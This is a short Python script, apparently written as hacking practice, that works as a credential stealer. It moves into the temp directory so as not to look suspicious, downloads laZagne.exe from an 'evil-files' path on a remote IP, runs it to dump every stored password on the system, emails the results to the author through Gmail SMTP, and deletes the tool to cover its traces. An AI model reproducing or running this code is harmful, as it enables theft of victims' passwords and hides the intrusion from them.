#!usr/bin/env python
import subprocess, smtplib, re, requests, os, tempfile
#also use laZagne repository

#download a file
def download(url):
    get_response = requests.get(url)
    file_name= url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    #google server and port for SMTP server instance to send a mail
    server=smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    #send mail to myself the info of the executed command
    server.sendmail(email, email, message)
    server.quit()

#get temp dir, cross platform, better to temp so would not be suspicious
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
#server link that has lazagne repo inside
download("https://10.10.10.10/evil-files/laZagne.exe")
#laZagne command to catch all passwds in system
result=subprocess.check_output("laZagne.exe all",shell=True)
#send results to my mail by calling the function
send_mail("email", "passwd", result)
#once done,remove the laZagne.exe to cover traces
os.remove("laZagne.exe")
